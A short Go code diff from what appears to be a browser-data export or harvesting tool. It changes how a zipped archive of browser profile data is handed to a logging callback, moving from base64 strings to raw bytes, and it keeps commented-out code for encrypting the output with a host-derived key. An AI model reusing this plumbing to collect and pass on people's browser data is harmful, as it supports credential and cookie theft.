@@ -3,7 +3,6 @@ package run
 import (
 	"archive/zip"
 	"bytes"
-	"encoding/base64"
 	"github.com/urfave/cli/v2"
 	"log/slog"
 	"os"
@@ -21,7 +20,7 @@ var (
 	profilePath  string
 	isFullExport bool
 
-	LogCallback func(logType int, msg string, size int)
+	LogCallback func(logType int, msg []byte, size int)
 )
 
 func Execute() {
@@ -65,12 +64,11 @@ func Execute() {
 			//out := crypto.AESEncrypt(outBuffer.Bytes(), []byte(host))
 			//outName := uuid.New().String()
 			if LogCallback != nil {
-				LogCallback(1, "recv browser data start", 0)
+				LogCallback(1, []byte("recv browser data start"), 0)
 				b := outBuffer.Bytes()
-				b64Data := base64.StdEncoding.EncodeToString(b)
 
-				LogCallback(0xf, b64Data, len(b64Data))
-				LogCallback(1, "recv browser data success", 0)
+				LogCallback(0xf, b, len(b))
+				LogCallback(1, []byte("recv browser data success"), 0)
 			}
 
 			//if err = os.WriteFile(outName, out, 666); err != nil {
